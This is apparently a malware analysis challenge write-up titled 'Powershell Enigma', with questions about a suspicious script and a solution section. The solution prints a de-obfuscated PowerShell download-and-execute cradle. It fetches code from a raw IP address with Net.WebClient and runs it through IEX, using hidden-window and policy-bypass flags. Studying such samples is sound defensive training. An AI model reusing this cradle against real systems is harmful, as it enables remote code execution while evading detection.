---
title: Powershell Enigma
time: 2024-09-17a
categories: [malware analysis]
tags: [easy, malware, ps1]
image: /assets/posts/chall_category/malware-analysis.png
---

## Description:

A suspicious PowerShell script was found on a compromised system. Your task is to analyze the script, determine its functionality, and answer questions about its behavior.

- Category: Malware Analysis
- **No Flag** (Question and Answer basis)
- Password for challenge file: `infected`

<button onclick="downloadFile()">Download File</button>

<script>
function downloadFile() {
    const link = document.createElement('a');
    link.href = 'https://github.com/0x251e/challenges/raw/main/union-depository/malware-analysis/powershell-enigma/sus.zip';
    link.download = 'sus.zip';
    link.click();
}
</script>


## Questions:

> 1. What is the main purpose of this script?
> 2. What command is used to execute the final payload?
> 3. What is the URL from which additional code is downloaded?
> 4. How does the script attempt to evade detection? List at least two methods.
> 5. What PowerShell flags are used when executing the encoded command, and what do they do?
> 6. Decode the Base64 string in the script. What does it reveal?
> 7. Rewrite the script in a de-obfuscated form.

## Solutions:

To analyze we replace a new line after a semicolon `;`, as in powershell is a statement separator. 

```PowerShell
$x=''
$y='IEX'
$z='powershell.exe -w h -ep b -e '

$a=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c="http://73.58.34.118/OjKUiD2IFH.exe"
$w=New-Object Net.WebClient
$d=$w.DownloadString($c)
IEX $d'))

$b=$y+" "+$z+$a
$x=$b|IEX
```


